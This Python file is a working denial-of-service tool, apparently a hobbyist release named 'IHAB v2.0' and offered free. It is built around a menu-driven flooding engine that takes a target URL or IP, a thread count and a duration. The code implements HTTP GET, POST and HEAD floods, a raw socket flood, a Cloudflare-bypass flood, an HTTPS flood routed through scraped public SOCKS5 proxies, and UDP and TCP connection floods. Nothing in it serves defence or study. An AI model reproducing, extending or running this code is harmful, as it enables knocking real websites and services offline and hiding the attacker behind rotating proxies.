# -*- coding: utf-8 -*-
# IHAB v2.0 - Full Layer 7 + Layer 4 (Fixed for Termux)
# All for FREE

import threading
import requests
import cloudscraper
import datetime
import time
import socket
import socks
import ssl
import random
import os
from urllib.parse import urlparse
from sys import stdout
from colorama import Fore, init

init(convert=True)

# ========== COUNTDOWN ==========
def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "f"""
╔══════════[Attack time]══════════╗     
    Time: {str((until - datetime.datetime.now()).total_seconds())}                         
╚═════════════════════════════════╝""")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
            return

# ========== USER AGENTS ==========
useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1"
]

# ========== PROXY ==========
proxyResources = [
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
    'https://www.proxy-list.download/api/v1/get?type=socks5',
    'https://www.proxyscan.io/download?type=socks5',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
]
socksFile = "socks5.txt"

def socksCrawler():
    """جلب بروكسيات Socks5 وتنظيفها من أي نص غير صالح"""
    try:
        with open(socksFile, 'w') as f:
            for url in proxyResources:
                try:
                    response = requests.get(url, timeout=15)
                    lines = response.text.split('\n')
                    for line in lines:
                        # شرط قبول السطر: يحتوي على : و . ولا يحتوي على كلمات دلالية على خطأ
                        if ':' in line and '.' in line and 'Cloudflare' not in line and '<' not in line and 'html' not in line:
                            f.write(line.strip() + '\n')
                except Exception as e:
                    print(f"[-] فشل جلب البروكسيات من {url}: {e}")
        print("[+] تم تحديث ملف socks5.txt بنجاح")
    except Exception as e:
        print(f"[-] خطأ في socksCrawler: {e}")

# ========== GET TARGET ==========
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    target['port'] = "443" if urlparse(url).scheme == "https" else "80"
    return target

# ================================================================
# ==================== LAYER 7 METHODS ============================
# ================================================================

# 1. GET FLOOD
def launch_get(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=attack_get, args=(url, until)).start()

def attack_get(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url, timeout=2)
        except:
            pass

# 2. POST FLOOD
def launch_post(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=attack_post, args=(url, until)).start()

def attack_post(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url, timeout=2)
        except:
            pass

# 3. HEAD FLOOD
def launch_head(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=attack_head, args=(url, until)).start()

def attack_head(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url, timeout=2)
        except:
            pass

# 4. SOCKET FLOOD (HTTP/HTTPS)
def launch_socket(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\nUser-Agent: {random.choice(useragents)}\r\nConnection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        threading.Thread(target=attack_socket, args=(target, until, req)).start()

def attack_socket(target, until_datetime, req):
    if target['scheme'] == 'https':
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target['host'], int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        except:
            return
    else:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target['host'], int(target['port'])))
        except:
            return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            s.send(str.encode(req))
        except:
            s.close()
            return

# 5. CLOUDFLARE BYPASS (CFB)
def launch_cfb(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        threading.Thread(target=attack_cfb, args=(url, until, scraper)).start()

def attack_cfb(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=3)
        except:
            pass

# 6. SKY (HTTPS with SOCKS5)
def launch_sky(url, th, t):
    socksCrawler()
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    try:
        with open("./socks5.txt", 'r') as f:
            prox = [line.strip() for line in f if ':' in line and '.' in line]
    except:
        prox = []
    if not prox:
        print("[!] لا توجد بروكسيات Socks5. جارٍ جلبها...")
        socksCrawler()
        try:
            with open("./socks5.txt", 'r') as f:
                prox = [line.strip() for line in f if ':' in line and '.' in line]
        except:
            prox = []
    for _ in range(int(th)):
        threading.Thread(target=attack_sky, args=(url, until, prox)).start()

def attack_sky(url, until_datetime, prox):
    if not prox:
        return
    proxy = random.choice(prox).split(":")
    if len(proxy) < 2:
        return
    req = f"GET {url} HTTP/1.1\r\nHost: {urlparse(url).netloc}\r\nUser-Agent: {random.choice(useragents)}\r\nConnection: Keep-Alive\r\n\r\n"
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
            s.connect((urlparse(url).netloc, 443))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
        except:
            s.close()

# ================================================================
# ==================== LAYER 4 METHODS ============================
# ================================================================

# 7. UDP FLOOD
def launch_udp(ip, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=attack_udp, args=(ip, int(port), until)).start()

def attack_udp(ip, port, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(65507)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(packet, (ip, port))
        except:
            sock.close()
            return

# 8. TCP SYN FLOOD
def launch_tcp(ip, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=attack_tcp, args=(ip, int(port), until)).start()

def attack_tcp(ip, port, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            s.send(b"SYN")
            s.close()
        except:
            pass

# ================================================================
# ==================== INPUT FUNCTIONS ============================
# ================================================================

def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.LIGHTGREEN_EX+": ")
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTGREEN_EX+": ")
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTGREEN_EX+": ")
    t = input()
    return target, thread, t

def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTGREEN_EX+": ")
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTGREEN_EX+": ")
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTGREEN_EX+": ")
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTGREEN_EX+": ")
    t = input()
    return target, port, thread, t

# ================================================================
# ==================== HELP & UI =================================
# ================================================================

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def help():
    stdout.write("""
╔══════════════════════════════════════════════════════════╗
║  LAYER 7 METHODS:                                       ║
║   get     - GET flood                                   ║
║   post    - POST flood                                  ║
║   head    - HEAD flood                                  ║
║   socket  - Socket flood (HTTP/HTTPS)                   ║
║   cfb     - Cloudflare bypass                           ║
║   sky     - HTTPS + SOCKS5 flood                        ║
╠══════════════════════════════════════════════════════════╣
║  LAYER 4 METHODS:                                       ║
║   udp     - UDP flood                                   ║
║   tcp     - TCP SYN flood                               ║
╠══════════════════════════════════════════════════════════╣
║  OTHER:                                                 ║
║   help    - Show this menu                              ║
║   clear   - Clear screen                                ║
║   exit    - Exit                                        ║
╚══════════════════════════════════════════════════════════╝
""")

def title():
    clear()
    stdout.write("""
    ██╗  ██╗  █████╗  ██████╗ 
    ██║  ██║ ██╔══██║ ██  ██║ 
    ███████║ ███████║ ███████╗ 
    ██╔══██║ ██╔══██║ ██   ██║ 
    ██║  ██║ ██║  ██║ ███████║ 
    ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝ 
    DDOS BY IHAB - Layer 7 + Layer 4
    Type 'help' for commands
    """)

# ================================================================
# ==================== COMMAND HANDLER ============================
# ================================================================

def command():
    stdout.write(Fore.LIGHTGREEN_EX+"╔═══[root@IHAB]\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    cmd = input().lower()

    if cmd in ["cls", "clear"]:
        title()
    elif cmd == "help":
        help()
    elif cmd == "exit":
        exit()
    
    # ===== LAYER 7 =====
    elif cmd == "get":
        target, th, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_get(target, th, t)
        timer.join()
    
    elif cmd == "post":
        target, th, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_post(target, th, t)
        timer.join()
    
    elif cmd == "head":
        target, th, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_head(target, th, t)
        timer.join()
    
    elif cmd == "socket":
        target, th, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_socket(target, th, t)
        timer.join()
    
    elif cmd == "cfb":
        target, th, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_cfb(target, th, t)
        timer.join()
    
    elif cmd == "sky":
        target, th, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_sky(target, th, t)
        timer.join()
    
    # ===== LAYER 4 =====
    elif cmd == "udp":
        target, port, th, t = get_info_l4()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_udp(target, port, th, t)
        timer.join()
    
    elif cmd == "tcp":
        target, port, th, t = get_info_l4()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        launch_tcp(target, port, th, t)
        timer.join()
    
    else:
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. Type 'help'.\n")

# ================================================================
# ==================== MAIN ======================================
# ================================================================

if __name__ == '__main__':
    title()
    while True:
        command()